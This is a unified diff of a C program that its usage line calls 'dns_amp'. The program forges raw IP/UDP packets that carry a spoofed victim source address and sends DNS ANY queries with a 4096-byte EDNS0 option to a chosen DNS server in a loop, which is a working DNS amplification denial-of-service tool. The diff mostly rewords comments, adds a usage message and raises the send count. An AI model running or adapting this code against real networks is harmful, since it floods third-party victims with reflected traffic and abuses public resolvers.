@@ -39,32 +39,39 @@ struct ps_udphdr
     unsigned char udphdr[200];
 };
 
-//Fabricate the dns query
+// fabricate the DNS query
 int setQueryName(unsigned char *start, string name, u_int16_t type, u_int16_t Class, int total_length);
-// count the checksum of udp&ip header
+// get the checksum of UDP/IP header
 u_int16_t checksum(u_int16_t *buff, int _16bitword);
 
 
 int main(int argc, char *argv[])
 {
-    // Create a raw socket with the UDP protocol
+    // Create a UDP raw socket
     int sd, total_len = 0, size = 128, o = 1;
 	unsigned char *sendbuff;
 	
+	if(argc<=3){
+		printf("ERROR argc\n");
+		printf("Usage:  sudo ./dns_amp <Victim_IP> <UDP_Source_Port> <DNS_Server_IP>\n");
+		exit(-1);
+	}
+	
+	//socket()
 	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
     if(sd<0){
-        printf("use sudo\n");
-        printf("error in socket\n");
-        return -1;
+		printf("ERROR socket()\n");
+        printf("check if you've add 'sudo'\n");
+        exit(-1);
     }
     
     sendbuff = (unsigned char*)malloc(size); // increase in case of more data
     memset(sendbuff, 0, size);
 	
-    //the begin of sendbuff is ip header
+    //the begin of sendbuff is IP header
     if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (const int*)(&o), sizeof(int))<0){
-        printf("error");
-        exit(1);
+        printf("ERROR");
+        exit(-1);
     }
 	
 	
@@ -85,7 +92,7 @@ int main(int argc, char *argv[])
     uh->dest = htons(53);
     total_len = sizeof(struct udphdr)+sizeof(struct iphdr);
 	
-    // Fabricate dns query
+    // Fabricate the DNS query
     struct dns_query *q = (struct dns_query*)(sendbuff+sizeof(struct udphdr)+sizeof(struct iphdr));
     q->id = htons(u_int16_t(710893));
     q->checkDisable = htons(0x0100);
@@ -95,18 +102,19 @@ int main(int argc, char *argv[])
     q->add_rr = htons(1);
     total_len = setQueryName((unsigned char*)q+6*sizeof(u_int16_t), "google.com", 255, 1, total_len+sizeof(u_int16_t)*6);
 	
-    // Fabricate additional request(edns0 part)
+    // Fabricate additional request (EDNS0)
     edns0 *aq = (edns0*)(sendbuff+total_len);
     aq->type = htons(0x29);
     aq->size = htons(4096);
     total_len += sizeof(edns0);
 	
-    printf("total packet size: %d\n", total_len+14); // 14 is size of ethhdr
-    //total_len;
+    printf("packet size: %d byte(s)\n", total_len+14); // 14 is the size of "ethhdr"
+	
+    //total_len
     iph->tot_len = htons(total_len);
     uh->len = htons(total_len-sizeof(iphdr));
 	
-    // udp header checksum
+    // checksum of the UDP header
     ps_udphdr check;
     memset(&check, 0, sizeof(check));
     check.src = inet_addr(argv[1]);
@@ -117,7 +125,7 @@ int main(int argc, char *argv[])
     memcpy(check.udphdr, sendbuff+sizeof(iphdr), total_len-sizeof(iphdr));
     uh->check = checksum((u_int16_t*)(&check), ((sizeof(unsigned)*3+total_len-sizeof(iphdr)+1)/2)); // +1 beacuse size may be odd.
 	
-    // ip header checksum
+    // checksum of the IP header 
     iph->check = checksum((u_int16_t*)(sendbuff), (sizeof(struct iphdr)/2));
 	
     // sockaddr
@@ -126,7 +134,7 @@ int main(int argc, char *argv[])
     sin.sin_port = htons(53);
     sin.sin_addr.s_addr = inet_addr(argv[3]);
 	
-    for (int i=0;i<3;i++){
+    for (int i=0;i<5;i++){
         int send_len = sendto(sd, sendbuff, total_len, 0, (const struct sockaddr *)&sin, sizeof(struct sockaddr));
         if (send_len<0){
             printf("error in sending....sendlen = %d....errno = %d\n", send_len, send_len);
@@ -138,6 +146,7 @@ int main(int argc, char *argv[])
     return 0;
 }
 
+// fabricate the DNS query
 int setQueryName(unsigned char *start, string name, u_int16_t type, u_int16_t Class, int total_length){
     int j = 0;
     
@@ -156,6 +165,7 @@ int setQueryName(unsigned char *start, string name, u_int16_t type, u_int16_t Cl
     return total_length+name.size()+5;
 }
 
+// get the checksum of UDP/IP header
 u_int16_t checksum(u_int16_t *buff, int _16bitword){
     unsigned long sum;
     for (sum=0;_16bitword>0;_16bitword--) sum += *(buff)++;
